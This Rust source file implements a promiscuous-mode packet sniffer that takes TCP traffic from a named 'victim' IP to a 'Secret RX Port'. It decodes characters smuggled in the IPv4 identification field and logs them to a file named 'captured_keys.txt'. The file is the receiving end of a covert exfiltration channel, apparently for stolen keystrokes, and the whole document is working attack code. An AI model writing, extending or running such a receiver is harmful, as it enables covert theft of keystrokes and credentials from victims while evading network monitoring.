use chrono::Local;
use pcap::{Capture, Device};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::io::{self, Write};
use std::fs::{OpenOptions, create_dir_all};
use std::path::Path;

use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::tcp::TcpPacket; // <--- Make sure this is imported
use pnet::packet::Packet;         // <--- And this

pub struct PcapHandle {
    running: Arc<AtomicBool>,
}

impl PcapHandle {
    // CHANGE: Added `port: u16` to the arguments
    pub fn start(interface: &str, victim_ip: String, port: u16) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let flag = running.clone();
        let iface = interface.to_string();

        thread::spawn(move || {
            let devices = Device::list().expect("Failed to list devices");
            let device = match devices.into_iter().find(|d| d.name == iface) {
                Some(d) => d,
                None => {
                    eprintln!("\n[!] Interface '{}' not found.", iface);
                    return;
                }
            };

            // Use the directory structure you confirmed
            let pcap_dir = Path::new("./data/pcaps");
            if let Err(e) = create_dir_all(pcap_dir) {
                eprintln!("[!] Failed to create pcap directory: {}", e);
                return;
            }

            // Matches the filename in your output
            let log_path = pcap_dir.join("captured_keys.txt"); 
            println!("[DEBUG] Sniffer active on Port {}. Logging to: {:?}", port, log_path);

            // ------------------------------------------------
            // 3. Start Capture
            // ------------------------------------------------
            let mut cap = match Capture::from_device(device) {
                Ok(c) => c.promisc(true).immediate_mode(true).timeout(1000).open(),
                Err(e) => {
                    eprintln!("[!] Failed to open capture: {}", e);
                    return;
                }
            };

            let mut cap = match cap {
                Ok(c) => c,
                Err(_) => return,
            };

            // Filter for TCP packets from the victim
            // We can't filter by port in BPF easily if we are promiscuous, so we do it in logic below
            let filter = format!("src host {}", victim_ip);
            cap.filter(&filter, true).ok();

            while flag.load(Ordering::Relaxed) {
                if let Ok(packet) = cap.next_packet() {
                    // Skip Ethernet header (14 bytes)
                    let ip_start = 14;
                    if packet.data.len() <= ip_start { continue; }

                    if let Some(ip_packet) = Ipv4Packet::new(&packet.data[ip_start..]) {
                        // 1. Verify it's a TCP packet
                        if let Some(tcp_packet) = TcpPacket::new(ip_packet.payload()) {
                            
                            // 2. CRITICAL FIX: Only accept packets destined for our Secret RX Port
                            if tcp_packet.get_destination() == port {
                                
                                let covert_byte = (ip_packet.get_identification() & 0x00FF) as u8;

                                if (32..=126).contains(&covert_byte) {
                                    let c = covert_byte as char;

                                    // Print to console
                                    print!("{}", c);
                                    io::stdout().flush().unwrap();

                                    // Save to file
                                    if let Ok(mut file) = OpenOptions::new()
                                        .create(true)
                                        .append(true)
                                        .open(&log_path)
                                    {
                                        write!(file, "{}", c).ok();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            println!("\n[*] Capture stopped.");
        });

        Self { running }
    }
}

impl Drop for PcapHandle {
    fn drop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }
}
